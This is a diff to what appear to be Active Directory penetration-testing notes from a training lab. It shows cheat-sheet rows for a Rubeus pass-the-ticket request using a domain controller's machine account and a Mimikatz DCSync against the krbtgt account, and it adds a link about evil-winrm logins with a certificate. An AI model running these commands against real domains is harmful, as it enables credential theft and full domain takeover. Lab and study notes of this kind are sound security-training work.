@@ -391,6 +391,8 @@ PS C:\tools> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(user
 | `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt` | Uses Rubeus to request a TGT and perform a `pass-the-ticket attack` using the machine account (`/user:ACADEMY-EA-DC01$`) of a Windows target. Performed from a Windows-based host. |
 | `mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`      | Performs a DCSync attack using `Mimikatz`. Performed from a Windows-based host. |
 
+evil-winrm with .pfx  
+https://notes.shashwatshah.me/windows/active-directory/winrm-using-certificate-pfx
 
 
 # Miscellaneous Misconfigurations
